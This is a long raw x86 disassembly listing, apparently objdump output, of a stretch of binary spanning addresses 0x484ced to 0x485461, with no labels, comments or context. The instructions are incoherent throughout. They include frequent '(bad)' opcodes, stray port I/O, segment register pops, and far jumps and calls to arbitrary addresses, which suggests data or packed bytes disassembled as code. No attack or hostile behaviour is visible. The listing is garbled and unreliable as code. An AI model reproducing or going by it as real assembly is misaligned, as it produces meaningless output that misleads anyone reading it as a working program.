  484ced:	bound  edi,QWORD PTR ss:[edi+esi*8+0x37ebf789]
  484cf5:	ja     0x484cd8
  484cf7:	pop    ebp
  484cf8:	mov    WORD PTR [ecx+0x631737ae],ss
  484cfe:	lds    ecx,FWORD PTR [edi]
  484d00:	cmp    al,0x7
  484d02:	xchg   DWORD PTR [ecx],edi
  484d04:	jmp    FWORD PTR [ebx]
  484d06:	jo     0x484ca8
  484d08:	inc    ebx
  484d09:	fstp   TBYTE PTR [edi-0x49]
  484d0c:	add    DWORD PTR [ebp+0x29],ebx
  484d0f:	adc    eax,0x7185a717
  484d14:	mov    ecx,0xaa2bffc6
  484d19:	out    0xac,eax
  484d1b:	adc    ebx,DWORD PTR [edi-0x12bccc3a]
  484d21:	add    edx,ebx
  484d23:	inc    esp
  484d24:	daa    
  484d25:	dec    edi
  484d26:	ja     0x484d03
  484d28:	sub    DWORD PTR [ebp-0x59],edi
  484d2b:	ss jnp 0x484d64
  484d2e:	jnp    0x484cdf
  484d30:	mov    eax,0xabd39e18
  484d35:	aaa    
  484d36:	xlat   BYTE PTR ds:[ebx]
  484d37:	inc    esp
  484d38:	xchg   esp,eax
  484d39:	je     0x484d9c
  484d3b:	dec    ebp
  484d3c:	outs   dx,DWORD PTR ds:[esi]
  484d3d:	mov    esi,0xad1b4837
  484d42:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  484d43:	xchg   DWORD PTR [ebx-0x3a],eax
  484d46:	bound  ebx,QWORD PTR ds:0xf9707e8
  484d4c:	adc    eax,0xb3d5283e
  484d51:	mov    bh,0x44
  484d53:	out    dx,eax
  484d54:	sbb    DWORD PTR [edi],eax
  484d56:	imul   edx,esp,0xefa0876f
  484d5c:	sbb    eax,0x17af8b1c
  484d61:	stos   DWORD PTR es:[edi],eax
  484d62:	inc    ebx
  484d63:	sbb    DWORD PTR ss:[ebx+0x1a],ecx
  484d67:	ss inc edx
  484d69:	xchg   DWORD PTR [ebp-0xc27a44f],esp
  484d6f:	(bad)  
  484d70:	vmread esp,eax
  484d73:	ss (bad) 
  484d75:	mov    bh,0x46
  484d77:	pop    es
  484d78:	das    
  484d79:	or     BYTE PTR [esi],bl
  484d7b:	push   cs
  484d7c:	(bad)  
  484d7d:	out    0xab,eax
  484d7f:	into   
  484d80:	jg     0x484d46
  484d82:	ins    DWORD PTR es:[edi],dx
  484d83:	adc    ecx,DWORD PTR [esi+0x461f6733]
  484d89:	arpl   WORD PTR [ebp+0x17],bx
  484d8c:	sub    al,0x17
  484d8e:	push   edi
  484d8f:	inc    esp
  484d90:	aas    
  484d91:	mov    ebx,0x13516be0
  484d96:	jnp    0x8a8b6ce0
  484d9c:	add    ebp,DWORD PTR [eax-0x31]
  484d9f:	or     esi,DWORD PTR [di-0x11]
  484da3:	mov    ah,0x60
  484da5:	retf   
  484da6:	mov    ch,bh
  484da8:	inc    esi
  484da9:	inc    ebp
  484daa:	dec    eax
  484dab:	nop
  484dac:	sub    bl,BYTE PTR [edi]
  484dae:	scas   eax,DWORD PTR es:[edi]
  484daf:	push   DWORD PTR ds:0xffafa6dc
  484db5:	(bad)  
  484db6:	lss    ecx,FWORD PTR es:0x276fad58
  484dbe:	fld    TBYTE PTR [ecx]
  484dc0:	aam    0xc1
  484dc2:	and    ebx,esp
  484dc4:	pcmpgtd mm7,QWORD PTR [ecx]
  484dc7:	cs in  al,0x7d
  484dca:	pusha  
  484dcb:	(bad)  
  484dcd:	inc    ecx
  484dce:	inc    ebx
  484dcf:	jo     0x484e11
  484dd1:	dec    esp
  484dd2:	push   ds
  484dd3:	push   esi
  484dd4:	inc    edx
  484dd5:	mov    ebx,0x3e8a4c32
  484dda:	(bad)  
  484ddb:	bound  eax,QWORD PTR [ecx+0x6f]
  484dde:	push   ebp
  484ddf:	pop    ebp
  484de0:	cld    
  484de1:	xor    al,0xbb
  484de3:	inc    ecx
  484de4:	adc    esi,DWORD PTR [edi]
  484de6:	push   ss
  484de7:	jge    0x484dcc
  484de9:	test   BYTE PTR [edx-0x3d],bl
  484dec:	xlat   BYTE PTR ds:[ebx]
  484ded:	inc    esi
  484dee:	cld    
  484def:	rcl    BYTE PTR [edi],0x2b
  484df2:	adc    esi,DWORD PTR [esi]
  484df4:	jg     0x484dd8
  484df6:	add    bl,BYTE PTR [ebx]
  484df8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  484df9:	inc    ebx
  484dfa:	adc    eax,DWORD PTR [edi]
  484dfc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  484dfd:	outs   dx,DWORD PTR ds:[esi]
  484dfe:	call   0x777fac5f
  484e03:	add    edi,DWORD PTR ds:0x7af752e2
  484e09:	outs   dx,DWORD PTR ds:[esi]
  484e0a:	and    ebx,DWORD PTR [eax]
  484e0c:	lods   al,BYTE PTR ds:[esi]
  484e0d:	fsub   DWORD PTR [eax+0x1a2a57ef]
  484e13:	sub    esi,DWORD PTR [eax+eiz*4-0x727128e9]
  484e1a:	(bad)  
  484e1c:	imul   edi,DWORD PTR [edi],0x4f
  484e1f:	repz jmp 0x484e8c
  484e22:	or     DWORD PTR [ebx],0xffffffc7
  484e25:	pop    ds
  484e26:	xor    bh,BYTE PTR [edx+0x57]
  484e29:	jne    0x484df4
  484e2b:	inc    ebp
  484e2c:	cmp    BYTE PTR [edi-0x2217b8be],bl
  484e32:	add    DWORD PTR [esi],0x17869f06
  484e38:	pop    eax
  484e39:	xlat   BYTE PTR ds:[ebx]
  484e3a:	addr16 pop esp
  484e3c:	jecxz  0x484e61
  484e3e:	inc    esi
  484e3f:	aas    
  484e40:	sub    al,0xc2
  484e42:	sbb    al,0x1f
  484e44:	out    0x67,eax
  484e46:	xor    ch,BYTE PTR [edi-0x4a]
  484e49:	pop    ecx
  484e4a:	sub    dl,BYTE PTR [esi]
  484e4c:	scas   eax,DWORD PTR es:[di]
  484e4e:	lahf   
  484e4f:	inc    edx
  484e50:	ja     0x484e3f
  484e52:	dec    eax
  484e53:	pop    edx
  484e54:	jmp    0xd0175937
  484e59:	das    
  484e5a:	call   0x1267f3b5
  484e5f:	jmp    0x484ed2
  484e61:	retf   
  484e62:	in     eax,dx
  484e63:	mov    ch,bh
  484e65:	aaa    
  484e66:	pop    ss
  484e67:	inc    esp
  484e68:	push   0x78
  484e6a:	xchg   edx,eax
  484e6b:	adc    al,BYTE PTR [edi]
  484e6d:	dec    edi
  484e6e:	push   ebx
  484e6f:	mov    bh,0xe3
  484e71:	call   0xef6f95be
  484e76:	push   cs
  484e77:	mov    cl,0x7e
  484e79:	pop    esp
  484e7a:	inc    edx
  484e7b:	dec    edi
  484e7c:	aaa    
  484e7d:	xor    dh,BYTE PTR [edi+0x4293c7ae]
  484e83:	(bad)  [esi]
  484e85:	push   edi
  484e86:	nop
  484e87:	ja     0x484ea8
  484e89:	les    eax,FWORD PTR [edi]
  484e8b:	mov    esi,0x5a9c325e
  484e90:	scas   al,BYTE PTR es:[edi]
  484e91:	mov    edx,0xd735a745
  484e96:	pop    es
  484e97:	mov    ah,0x2
  484e99:	popa   
  484e9a:	mov    edi,0x23a40e77
  484e9f:	imul   edi,DWORD PTR [ebx-0x54fee289],0x6
  484ea6:	or     edi,DWORD PTR [edi+0x0]
  484ea9:	pop    edx
  484eaa:	mov    ebx,ebx
  484eac:	adc    dl,BYTE PTR [edi]
  484eae:	cmp    DWORD PTR [edi+0x48],ecx
  484eb1:	mov    DWORD PTR [edi],ebx
  484eb3:	xchg   edi,eax
  484eb4:	rol    DWORD PTR [esi],cl
  484eb6:	xchg   ebx,eax
  484eb7:	cmp    DWORD PTR [edi+0x56],ebx
  484eba:	sub    bl,BYTE PTR [ebp+0x67e737b8]
  484ec0:	mov    al,ds:0x87a36a3e
  484ec5:	pop    edi
  484ec6:	xor    al,BYTE PTR [eax+0x48]
  484ec9:	xchg   ebp,eax
  484eca:	test   al,0x37
  484ecc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  484ecd:	inc    esi
  484ece:	jnp    0x484eaa
  484ed0:	out    dx,al
  484ed1:	inc    ebx
  484ed2:	div    BYTE PTR [edi-0x38a7fc2d]
  484ed8:	and    eax,0x3f3b6f3e
  484edd:	je     0x484e8a
  484edf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  484ee0:	dec    ebp
  484ee1:	out    0x4b,eax
  484ee3:	xchg   BYTE PTR [eax+0xd],ch
  484ee6:	(bad)  [ecx-0x22f0a4a1]
  484eec:	test   eax,0xd72b03b1
  484ef1:	fbstp  TBYTE PTR [edi]
  484ef3:	inc    edi
  484ef4:	loopne 0x484eac
  484ef6:	add    ebp,DWORD PTR [edi-0x25f06979]
  484efc:	(bad)  
  484efd:	test   DWORD PTR [ecx-0x2fa8ecd9],0x531f40f6
  484f07:	out    dx,eax
  484f08:	cmp    DWORD PTR [edi],edx
  484f0a:	div    DWORD PTR [eax+0x2f0f6d42]
  484f10:	iret   
  484f11:	push   es
  484f12:	mov    BYTE PTR ds:0x3e30935d,ah
  484f18:	xor    DWORD PTR [edi],edx
  484f1a:	jne    0x484ebf
  484f1c:	jne    0x484f65
  484f1e:	imul   eax,DWORD PTR [ebx+0x1b],0xffffffba
  484f22:	lods   eax,DWORD PTR ds:[esi]
  484f23:	mov    ds:0x35ef4756,al
  484f28:	pop    ss
  484f29:	fisttp DWORD PTR [edx-0x890f03b]
  484f2f:	(bad)  
  484f30:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  484f31:	add    eax,0x35634157
  484f36:	xchg   ebx,ebx
  484f38:	aam    0x86
  484f3a:	inc    edi
  484f3b:	mov    esp,0xc49b3f67
  484f40:	es and eax,0x8f350669
  484f46:	or     DWORD PTR ds:0x3077fc92,ebx
  484f4c:	sub    eax,DWORD PTR [ecx+0x3d]
  484f4f:	cmp    eax,0xe3b3ea1d
  484f54:	sbb    edi,edi
  484f56:	dec    edx
  484f57:	mov    bh,0xf4
  484f59:	jbe    0x484fca
  484f5b:	pop    ds
  484f5c:	pop    ss
  484f5d:	adc    bl,BYTE PTR [esi]
  484f5f:	xor    BYTE PTR [ecx],ch
  484f61:	out    0x44,al
  484f63:	das    
  484f64:	sbb    eax,0xf3ca01b
  484f69:	xor    eax,0x2133fe4f
  484f6e:	push   ebp
  484f6f:	cmp    ah,BYTE PTR [esi]
  484f71:	pop    ds
  484f72:	addr16 aad 0xc6
  484f75:	jnp    0x484ff3
  484f77:	add    eax,DWORD PTR [edx-0x449ee4e1]
  484f7d:	ret    0xfabb
  484f80:	aaa    
  484f81:	ja     0x484f7a
  484f83:	arpl   di,ax
  484f85:	inc    ecx
  484f86:	dec    esi
  484f87:	xchg   ebx,eax
  484f88:	das    
  484f89:	push   ebx
  484f8a:	adc    al,0xe2
  484f8c:	or     ch,bh
  484f8e:	pop    ss
  484f8f:	jg     0x484ffb
  484f91:	inc    ecx
  484f92:	xor    ax,0x74f7
  484f96:	pop    edi
  484f97:	mov    bh,cl
  484f99:	mov    dh,0x63
  484f9b:	repnz les ecx,FWORD PTR [edx]
  484f9e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  484f9f:	jnp    0x484f74
  484fa1:	push   ss
  484fa2:	scas   eax,DWORD PTR es:[edi]
  484fa3:	cs xor eax,0x31de296a
  484fa9:	pop    ds
  484faa:	cmp    cl,BYTE PTR [esi-0x48084a92]
  484fb0:	(bad)  
  484fb1:	aas    
  484fb2:	rcr    dh,cl
  484fb4:	xor    al,0x63
  484fb6:	mov    cl,0x32
  484fb8:	dec    esp
  484fb9:	jae    0x484fa6
  484fbb:	jp     0x484fc8
  484fbd:	jbe    0x484fa0
  484fbf:	pop    ds
  484fc0:	fistp  QWORD PTR [edi+0x4155be0f]
  484fc6:	(bad)  
  484fc7:	rcr    DWORD PTR [edi+0x4b],cl
  484fca:	inc    edx
  484fcb:	cmc    
  484fcc:	pop    eax
  484fcd:	rcl    ecx,cl
  484fcf:	mov    edi,0xf4be2741
  484fd4:	add    BYTE PTR ss:[ebx+0x600f8fa3],bl
  484fdb:	xor    eax,0x2ff6621d
  484fe0:	pop    edi
  484fe1:	inc    esi
  484fe2:	jmp    0x80bb:0x3f361a1b
  484fe9:	les    ebp,FWORD PTR [ecx-0x53e8c7f7]
  484fef:	add    BYTE PTR [edi-0x24],0x77
  484ff3:	xor    DWORD PTR [edi-0x21],ebp
  484ff6:	jmp    0x8322:0xbb383aca
  484ffd:	or     bl,BYTE PTR [ebx]
  484fff:	lea    edx,ds:0x40b55f8f
  485005:	jae    0x484fac
  485007:	xchg   edi,eax
  485008:	sbb    esi,DWORD PTR [edx]
  48500a:	scas   eax,DWORD PTR es:[edi]
  48500b:	jmp    0x43a7:0x7f054283
  485012:	adc    DWORD PTR [eax-0xf8ca56],edx
  485018:	ds dec ebx
  48501a:	cmp    al,0xbd
  48501c:	dec    ecx
  48501d:	ss stos DWORD PTR es:[edi],eax
  48501f:	add    ecx,DWORD PTR [edi+0x42]
  485022:	in     al,dx
  485023:	rol    BYTE PTR [edi+0x5fe73827],cl
  485029:	xchg   ecx,eax
  48502a:	es sub esp,edx
  48502d:	inc    dx
  48502f:	inc    esi
  485030:	fild   QWORD PTR [ebp-0x1ca951f7]
  485036:	adc    eax,DWORD PTR [edx+eiz*2+0x1b]
  48503a:	xchg   BYTE PTR [eax],ch
  48503c:	div    DWORD PTR [esi]
  48503e:	xlat   BYTE PTR ds:[ebx]
  48503f:	jg     0x48509b
  485041:	xor    BYTE PTR [ebx+0x43039b46],bh
  485047:	minps  xmm5,xmm0
  48504a:	call   0x4b581374
  48504f:	jmp    0x485071
  485051:	pop    ebx
  485052:	cmp    eax,esp
  485054:	jbe    0x48507d
  485056:	out    dx,eax
  485057:	ja     0x4850ab
  485059:	and    DWORD PTR ds:0x2a1f6ed4,ebp
  48505f:	ss sbb eax,0x27db556a
  485065:	aaa    
  485066:	ja     0x485068
  485068:	mov    bh,0x0
  48506a:	ja     0x485093
  48506c:	inc    esi
  48506d:	(bad)  
  48506e:	jg     0x485073
  485070:	jae    0x485052
  485072:	call   0xba6d:0x450742c7
  485079:	add    edi,ebp
  48507b:	dec    edi
  48507c:	retf   
  48507d:	mov    esi,DWORD PTR [esi]
  48507f:	dec    ebx
  485080:	mov    esi,0x5fb421de
  485085:	xchg   DWORD PTR [ebx],eax
  485087:	push   edi
  485088:	ss xchg ebp,eax
  48508a:	mov    eax,0x32ff9fa0
  48508f:	daa    
  485090:	adc    ah,bl
  485092:	or     BYTE PTR [ecx],dh
  485094:	xchg   DWORD PTR [ebx],esi
  485096:	loope  0x4850a1
  485098:	(bad)  
  485099:	mov    eax,0x587b6f17
  48509e:	popf   
  48509f:	rcr    BYTE PTR ds:0xa33fe67f,0xba
  4850a6:	sbb    eax,0xfa979738
  4850ab:	call   FWORD PTR [ebx]
  4850ad:	test   ah,dl
  4850af:	scas   al,BYTE PTR es:[edi]
  4850b0:	ss mov ebx,0x4308967b
  4850b6:	fisttp QWORD PTR [edx+0x2dfe0e9b]
  4850bc:	call   0xf341:0x93d77529
  4850c3:	call   0xa3b7f7db
  4850c8:	or     BYTE PTR [ebx-0x54b33146],0x3f
  4850cf:	das    
  4850d0:	xor    al,0x3b
  4850d2:	shr    DWORD PTR [edx],0xac
  4850d5:	imul   esi,DWORD PTR ds:0x16867f6f,0x9782e956
  4850df:	xor    eax,0x1d20d6e7
  4850e4:	ins    DWORD PTR es:[edi],dx
  4850e5:	aas    
  4850e6:	jnp    0x48509f
  4850e8:	popa   
  4850e9:	jne    0x4850a8
  4850eb:	xchg   edx,eax
  4850ec:	adc    esi,DWORD PTR [edi]
  4850ee:	aas    
  4850ef:	add    dh,al
  4850f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4850f2:	outs   dx,DWORD PTR ds:[esi]
  4850f3:	pop    es
  4850f4:	call   FWORD PTR [ebx+edi*8-0x2e]
  4850f8:	jnp    0x4850e1
  4850fa:	push   edi
  4850fb:	pop    es
  4850fc:	pop    edi
  4850fd:	inc    edx
  4850fe:	dec    ebp
  4850ff:	pop    edx
  485100:	mov    al,0x1c
  485102:	adc    al,BYTE PTR [edi+ebp*2-0x9]
  485106:	mov    ah,0x22
  485108:	dec    esp
  485109:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  48510a:	aas    
  48510b:	inc    ebp
  48510c:	lahf   
  48510d:	sbb    eax,0x27558b00
  485112:	or     al,bl
  485114:	fcomp  QWORD PTR [eax+0x396fbaae]
  48511a:	cmovae ecx,edi
  48511d:	sbb    ebp,DWORD PTR [ebp-0x6a]
  485120:	out    dx,al
  485121:	add    bl,ah
  485123:	inc    edx
  485124:	jmp    0x485182
  485126:	ror    DWORD PTR [esp+eax*2-0x9],0x42
  48512b:	jnp    0x485124
  48512d:	outs   dx,BYTE PTR ds:[esi]
  48512e:	xchg   DWORD PTR [edx],ebx
  485130:	push   cs
  485131:	shl    DWORD PTR [edi],cl
  485133:	inc    esp
  485134:	aas    
  485135:	pop    ds
  485136:	push   ebp
  485137:	add    BYTE PTR [esi+0xcaf9381],cl
  48513d:	pop    esp
  48513e:	xchg   ebx,eax
  48513f:	add    DWORD PTR [esi-0xdcdc0c9],0xfffffff5
  485146:	jecxz  0x485185
  485148:	stos   DWORD PTR es:[edi],eax
  485149:	jae    0x48510e
  48514b:	xor    DWORD PTR [esi+0x30],ebx
  48514e:	shr    BYTE PTR [edx],0x60
  485151:	jb     0x485184
  485153:	addr16 push esi
  485155:	dec    ecx
  485156:	add    DWORD PTR [ebp+0x456feeb7],0x75
  48515d:	test   DWORD PTR [esi+0x3334f6b],ecx
  485163:	out    dx,eax
  485164:	push   ds
  485165:	cmc    
  485166:	add    bl,0x17
  485169:	add    dh,bh
  48516b:	addr16 sbb dh,cl
  48516e:	test   al,0x34
  485170:	xchg   edi,eax
  485171:	(bad)  
  485172:	xor    dh,BYTE PTR [edx+0x33474236]
  485178:	add    DWORD PTR [bx+si+0x6e8a],esi
  48517d:	scas   eax,DWORD PTR es:[edi]
  48517e:	inc    esi
  48517f:	pop    ds
  485180:	iret   
  485181:	mov    dh,0x87
  485183:	dec    edi
  485184:	(bad)  
  485185:	xlat   BYTE PTR ds:[ebx]
  485186:	cmp    DWORD PTR [edi+0x2e8ab0cc],0x67
  48518d:	jg     0x485112
  48518f:	inc    esp
  485190:	daa    
  485191:	mov    al,0x2a
  485193:	push   ss
  485194:	jg     0x4851ad
  485196:	push   edi
  485197:	clc    
  485198:	mov    edx,0x67bfd5d2
  48519d:	pop    ds
  48519e:	fcmovnb st,st(7)
  4851a0:	mov    ds,WORD PTR [ebp+0x3fabe7b7]
  4851a6:	fiadd  WORD PTR [ebx]
  4851a8:	jne    0x485152
  4851aa:	inc    edx
  4851ab:	(bad)  
  4851ac:	arpl   WORD PTR [edi],di
  4851ae:	sar    BYTE PTR [ebx],cl
  4851b0:	(bad)  
  4851b1:	add    eax,0xdb0f2f57
  4851b6:	push   esp
  4851b7:	or     DWORD PTR [edi+0x1f],edx
  4851ba:	addr16 inc edx
  4851bc:	pop    ds
  4851bd:	add    eax,0x1f1c420c
  4851c2:	fidiv  DWORD PTR [eax+ebp*2+0x1f27711a]
  4851c9:	inc    edx
  4851ca:	stos   DWORD PTR es:[edi],eax
  4851cb:	mov    cl,0x61
  4851cd:	inc    edx
  4851ce:	sahf   
  4851cf:	test   BYTE PTR [edx+0x45],0xdf
  4851d3:	out    dx,eax
  4851d4:	es pop ss
  4851d6:	ret    
  4851d7:	inc    ebx
  4851d8:	inc    ebx
  4851d9:	data16 aaa 
  4851db:	push   cs
  4851dc:	xchg   edi,eax
  4851dd:	xchg   ebp,eax
  4851de:	fsubr  DWORD PTR [esi+0x4f]
  4851e1:	jnp    0x4851fa
  4851e3:	inc    esp
  4851e4:	pop    ds
  4851e5:	mov    edi,0x81f02ea5
  4851ea:	mov    edi,0x6e080f37
  4851ef:	aam    0x1a
  4851f1:	fstp   TBYTE PTR [ebx+0x5d3d0876]
  4851f7:	pop    ss
  4851f8:	ja     0x485199
  4851fa:	pop    ss
  4851fb:	sbb    dl,BYTE PTR [edx+0x1e26dc0a]
  485201:	xor    esi,DWORD PTR [ebx]
  485203:	mov    bl,0x70
  485205:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  485206:	dec    ebp
  485207:	daa    
  485208:	fild   WORD PTR [edi+0x62238baa]
  48520e:	sbb    ecx,edi
  485210:	scas   eax,DWORD PTR es:[edi]
  485211:	inc    ecx
  485212:	dec    esp
  485213:	mov    dh,BYTE PTR [ebp+0x5602426e]
  485219:	adc    esi,edx
  48521b:	dec    edi
  48521c:	aas    
  48521d:	jbe    0x4851d0
  48521f:	sub    ah,BYTE PTR [esi+0x7bf3247]
  485225:	jmp    0x4851d8
  485227:	imul   esi,DWORD PTR [ebx+eax*8-0x14f8c0a6],0xf7ddab11
  485232:	inc    edx
  485233:	jg     0x485234
  485235:	sub    ch,BYTE PTR [edx+edi*4+0x7f34c722]
  48523c:	jg     0x485210
  48523e:	xchg   DWORD PTR [esi+0x5a9fe7b4],ebp
  485244:	add    al,0xf
  485246:	inc    edi
  485247:	jnp    0x485288
  485249:	push   DWORD PTR [edx+ebp*8]
  48524c:	sbb    eax,edi
  48524e:	pop    ds
  48524f:	dec    edi
  485250:	mov    edi,0x8df02e89
  485255:	movzx  ebp,WORD PTR [edi+0x9e00f81]
  48525c:	fwait
  48525d:	rol    DWORD PTR [edi-0x54],cl
  485260:	imul   edi,DWORD PTR [ecx+0x6f],0xe9372f37
  485267:	(bad)  
  485268:	leave  
  485269:	aad    0x39
  48526b:	push   ds
  48526c:	inc    edx
  48526d:	xor    eax,0xea423737
  485272:	je     0x485243
  485274:	xor    ah,BYTE PTR [ebx]
  485276:	pop    ds
  485277:	aaa    
  485278:	pop    esp
  485279:	call   0x4241:0xc36a8f89
  485280:	fwait
  485281:	mov    DWORD PTR [ebp+0x37],ebx
  485284:	pop    ds
  485285:	and    DWORD PTR ds:0xf7d77600,ebp
  48528b:	xchg   ecx,eax
  48528c:	inc    edx
  48528d:	pop    esp
  48528e:	not    BYTE PTR [edi-0x51]
  485291:	sahf   
  485292:	xchg   DWORD PTR [ebx+0x2b],ebx
  485295:	mov    al,0x1a
  485297:	jg     0x485310
  485299:	mov    ebp,0x97e1371d
  48529e:	pop    ss
  48529f:	inc    ebx
  4852a0:	xchg   edi,eax
  4852a1:	push   DWORD PTR [edx+ecx*1]
  4852a4:	test   DWORD PTR ds:0xc3d1176f,esi
  4852aa:	xor    DWORD PTR [ecx+0x6f],esi
  4852ad:	jnp    0x485306
  4852af:	inc    edi
  4852b0:	pop    eax
  4852b1:	test   eax,0xd697d7c1
  4852b6:	lahf   
  4852b7:	imul   eax,edi,0x4b1fe8d4
  4852bd:	mov    dl,0x33
  4852bf:	push   ecx
  4852c0:	ror    BYTE PTR [esi],0x60
  4852c3:	imul   edx,DWORD PTR [ebp+0x67b023c0],0xffffffaf
  4852ca:	pop    ds
  4852cb:	xchg   esi,eax
  4852cc:	sbb    DWORD PTR [edi+0x5d],edx
  4852cf:	xor    bl,BYTE PTR [edi+0x36]
  4852d2:	xlat   BYTE PTR ds:[ebx]
  4852d3:	add    edx,DWORD PTR [ebp-0x50]
  4852d6:	add    dl,al
  4852d8:	inc    ecx
  4852d9:	aas    
  4852da:	pop    es
  4852db:	sub    eax,0x389fba58
  4852e0:	pop    es
  4852e1:	ja     0x48529a
  4852e3:	inc    edx
  4852e4:	adc    edi,DWORD PTR [esi-0x10c8cac9]
  4852ea:	shl    DWORD PTR [eax],cl
  4852ec:	jl     0x4852b0
  4852ee:	das    
  4852ef:	inc    edx
  4852f0:	mov    edi,0x34c09d41
  4852f5:	or     edi,DWORD PTR [edi+0x39]
  4852f8:	xchg   DWORD PTR [esi-0x487e3359],esi
  4852fe:	inc    ebp
  4852ff:	pop    ss
  485300:	daa    
  485301:	or     DWORD PTR [ebx],0xffffffdc
  485304:	and    DWORD PTR [ebx+0x16],edi
  485307:	inc    edi
  485308:	xlat   BYTE PTR ds:[ebx]
  485309:	jbe    0x4852b7
  48530b:	xchg   edx,eax
  48530c:	mov    edx,0xee0f7746
  485311:	xchg   esi,eax
  485312:	cs (bad) 
  485314:	push   DWORD PTR [ebx-0x3d]
  485317:	inc    ecx
  485318:	mov    al,0x41
  48531a:	(bad)  
  48531b:	fimul  DWORD PTR [edi]
  48531d:	xchg   DWORD PTR [edi+0xf],ebp
  485320:	cli    
  485321:	mov    eax,ds:0x3737b750
  485326:	fwait
  485327:	sti    
  485328:	mov    al,ds:0xb7a75176
  48532d:	addps  xmm1,XMMWORD PTR [ecx+0x3e9b5833]
  485334:	ret    
  485335:	test   al,0x2f
  485337:	arpl   WORD PTR [ebp+0x6f],cx
  48533a:	inc    edi
  48533b:	add    eax,0xb9a6ddb
  485340:	xor    edx,DWORD PTR [edi]
  485342:	inc    ecx
  485343:	pop    ds
  485344:	aaa    
  485345:	dec    ebp
  485346:	mov    eax,ds:0x35372a7e
  48534b:	out    0x39,eax
  48534d:	aad    0x65
  48534f:	ror    BYTE PTR [esi+0x6f],1
  485352:	jecxz  0x48538a
  485354:	dec    ebx
  485355:	pop    esp
  485356:	adc    DWORD PTR [edi+0x5a],edx
  485359:	daa    
  48535a:	imul   edx,DWORD PTR [esp+eiz*4],0x3
  48535e:	adc    edx,edi
  485360:	aaa    
  485361:	scas   eax,DWORD PTR es:[edi]
  485362:	pop    es
  485363:	test   eax,0xefa6d36a
  485368:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  485369:	fist   DWORD PTR [eax]
  48536b:	jecxz  0x485363
  48536d:	or     bh,bh
  48536f:	inc    esp
  485370:	mov    DWORD PTR [ebp+0x77],0xb6122c00
  485377:	(bad)  
  485378:	cvtps2pi mm4,QWORD PTR [eax-0x6d]
  48537c:	cmc    
  48537d:	inc    edi
  48537e:	daa    
  48537f:	ror    DWORD PTR [ebp+0x171f5be0],0x46
  485386:	outs   dx,DWORD PTR ds:[esi]
  485387:	xchg   BYTE PTR [edi+0x60c4456c],cl
  48538d:	mov    esi,0xae880757
  485392:	and    ah,BYTE PTR [edx-0x1]
  485395:	aaa    
  485396:	jmp    FWORD PTR [esi]
  485398:	cmc    
  485399:	popa   
  48539a:	lods   eax,DWORD PTR ds:[esi]
  48539b:	dec    ebx
  48539c:	and    esp,DWORD PTR [eax+0x1394f8df]
  4853a2:	xchg   DWORD PTR [ecx],esi
  4853a4:	add    edx,DWORD PTR [edx-0x5d]
  4853a7:	lock pop es
  4853a9:	imul   edi
  4853ab:	xchg   ebp,eax
  4853ac:	xchg   esi,eax
  4853ad:	push   esp
  4853ae:	sub    ebp,DWORD PTR [esi]
  4853b0:	xor    edx,DWORD PTR [edi-0x2d16a71f]
  4853b6:	scas   eax,DWORD PTR es:[edi]
  4853b7:	pop    ds
  4853b8:	and    ebp,edx
  4853ba:	rcr    DWORD PTR ds:0x973f5737,0x83
  4853c1:	cs and al,0xb6
  4853c4:	pop    ss
  4853c5:	pop    ds
  4853c6:	inc    edx
  4853c7:	lahf   
  4853c8:	gs dec eax
  4853ca:	pop    ss
  4853cb:	cs push es
  4853cd:	fistp  QWORD PTR [edi]
  4853cf:	mov    cl,0xeb
  4853d1:	mov    al,0x5d
  4853d3:	stos   DWORD PTR es:[edi],eax
  4853d4:	das    
  4853d5:	ds push edi
  4853d7:	lods   eax,DWORD PTR ds:[esi]
  4853d8:	jmp    0x36bff326
  4853dd:	xchg   ebx,eax
  4853de:	das    
  4853df:	mov    edx,0x5f9b7271
  4853e4:	ss pop es
  4853e6:	inc    ebp
  4853e7:	inc    ecx
  4853e8:	sahf   
  4853e9:	inc    ebx
  4853ea:	dec    edi
  4853eb:	loopne 0x48541a
  4853ed:	imul   edi,DWORD PTR [eax],0x56b2d7db
  4853f3:	sub    cl,cl
  4853f5:	xor    dl,BYTE PTR [ebx+0x56]
  4853f8:	arpl   WORD PTR [edx-0x48],bp
  4853fb:	xlat   BYTE PTR ds:[ebx]
  4853fc:	pop    edi
  4853fd:	cmp    BYTE PTR [edi],dl
  4853ff:	or     DWORD PTR [edi+0x6d],0xd52b0f24
  485406:	dec    edx
  485407:	and    ah,al
  485409:	pop    edi
  48540a:	dec    ebx
  48540b:	mov    edx,DWORD PTR [edi]
  48540d:	das    
  48540e:	(bad)  
  48540f:	(bad)  
  485410:	scas   eax,DWORD PTR es:[edi]
  485411:	xchg   DWORD PTR [ebx+0x4bb51e93],ebp
  485417:	pop    es
  485418:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  485419:	iret   
  48541a:	outs   dx,BYTE PTR ds:[esi]
  48541b:	fisttp DWORD PTR [esp+ebx*8]
  48541e:	push   ss
  48541f:	fisttp WORD PTR [edi]
  485421:	out    dx,al
  485422:	shl    BYTE PTR [esi-0x5],1
  485425:	add    bl,BYTE PTR [edi+0x1d1f3217]
  48542b:	mov    ebp,0x37cf6e49
  485430:	xor    edi,DWORD PTR [ebx]
  485432:	das    
  485433:	xchg   ebp,eax
  485434:	jne    0x4853df
  485436:	scas   eax,DWORD PTR es:[di]
  485438:	mov    edi,0x1d802aff
  48543d:	shl    BYTE PTR [edi],0xdf
  485440:	jo     0x485457
  485442:	popa   
  485443:	xlat   BYTE PTR ds:[ebx]
  485444:	push   edi
  485445:	pop    ebx
  485446:	inc    esp
  485447:	dec    eax
  485448:	sbb    eax,0x3f1f5a97
  48544d:	mov    edi,0xcc5a5460
  485452:	pop    edi
  485453:	idiv   DWORD PTR [eax+0x3bce03c4]
  485459:	sub    cl,BYTE PTR [edi+0x57]
  48545c:	ret    0xdc15
  48545f:	loop   0x485400
  485461:	outs   dx,DWORD PTR ds:[esi]
